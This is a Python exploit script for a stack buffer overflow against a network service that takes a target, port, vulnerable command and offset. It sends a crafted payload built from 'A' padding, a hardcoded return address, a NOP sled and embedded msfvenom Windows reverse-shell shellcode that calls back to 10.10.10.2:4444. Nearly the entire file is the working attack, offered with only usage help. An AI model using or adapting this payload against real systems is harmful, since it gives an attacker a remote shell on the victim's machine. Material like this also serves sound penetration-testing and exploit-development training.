#!/usr/bin/python
import optparse, sys, socket

parser = optparse.OptionParser('Example: python exploit.py -t <target host> -p <target port> -c <command> -o <offset>')
parser.add_option('-t', dest='target', type='string', help='Enter a target host')
parser.add_option('-p', dest='port', type='int', help='Enter a target port')
parser.add_option('-c', dest='command', type='string', help='Enter a vulnerable command')
parser.add_option('-o', dest='offset', type='int', help='Enter a target offset')
(options, args) = parser.parse_args()
target = options.target
port = options.port
command = options.command
offset = options.offset

if (target == None) | (port == None):
	print(parser.usage)
	exit(0)

ret = "\xaf\x11\x50\x62" #CHANGE RETURN AS NEEDED
pad = '\x90' * 20
#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.2 LPORT=4444 EXITFUNC=thread -a x86 -f c -b "\x00"
#Enter your own shell code here
shell_code = (
"\xba\x2f\xa3\xaf\xaa\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\x78\xad\x4d\x5f\x7a\x59\x13"
"\xa0\x82\x9a\x74\x28\x67\xab\xb4\x4e\xec\x9c\x04\x04\xa0\x10"
"\xee\x48\x50\xa2\x82\x44\x57\x03\x28\xb3\x56\x94\x01\x87\xf9"
"\x16\x58\xd4\xd9\x27\x93\x29\x18\x6f\xce\xc0\x48\x38\x84\x77"
"\x7c\x4d\xd0\x4b\xf7\x1d\xf4\xcb\xe4\xd6\xf7\xfa\xbb\x6d\xae"
"\xdc\x3a\xa1\xda\x54\x24\xa6\xe7\x2f\xdf\x1c\x93\xb1\x09\x6d"
"\x5c\x1d\x74\x41\xaf\x5f\xb1\x66\x50\x2a\xcb\x94\xed\x2d\x08"
"\xe6\x29\xbb\x8a\x40\xb9\x1b\x76\x70\x6e\xfd\xfd\x7e\xdb\x89"
"\x59\x63\xda\x5e\xd2\x9f\x57\x61\x34\x16\x23\x46\x90\x72\xf7"
"\xe7\x81\xde\x56\x17\xd1\x80\x07\xbd\x9a\x2d\x53\xcc\xc1\x39"
"\x90\xfd\xf9\xb9\xbe\x76\x8a\x8b\x61\x2d\x04\xa0\xea\xeb\xd3"
"\xc7\xc0\x4c\x4b\x36\xeb\xac\x42\xfd\xbf\xfc\xfc\xd4\xbf\x96"
"\xfc\xd9\x15\x38\xac\x75\xc6\xf9\x1c\x36\xb6\x91\x76\xb9\xe9"
"\x82\x79\x13\x82\x29\x80\xf4\x6d\x05\xe4\x84\x06\x54\xf8\xa7"
"\xff\xd1\x1e\xcd\xef\xb7\x89\x7a\x89\x9d\x41\x1a\x56\x08\x2c"
"\x1c\xdc\xbf\xd1\xd3\x15\xb5\xc1\x84\xd5\x80\xbb\x03\xe9\x3e"
"\xd3\xc8\x78\xa5\x23\x86\x60\x72\x74\xcf\x57\x8b\x10\xfd\xce"
"\x25\x06\xfc\x97\x0e\x82\xdb\x6b\x90\x0b\xa9\xd0\xb6\x1b\x77"
"\xd8\xf2\x4f\x27\x8f\xac\x39\x81\x79\x1f\x93\x5b\xd5\xc9\x73"
"\x1d\x15\xca\x05\x22\x70\xbc\xe9\x93\x2d\xf9\x16\x1b\xba\x0d"
"\x6f\x41\x5a\xf1\xba\xc1\x7a\x10\x6e\x3c\x13\x8d\xfb\xfd\x7e"
"\x2e\xd6\xc2\x86\xad\xd2\xba\x7c\xad\x97\xbf\x39\x69\x44\xb2"
"\x52\x1c\x6a\x61\x52\x35"
)

payload = "A" * offset + ret + pad + shell_code

try:
	print('\n[+] Sending Payload')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target , port))
	s.recv(1024)
	s.send((command + payload))
	s.close()
	print('[+] Payload Sent')
	print('[+] Check Your Listener\n')

except:
	print('[-] ERROR: Connection Refused!\n')
	sys.exit()
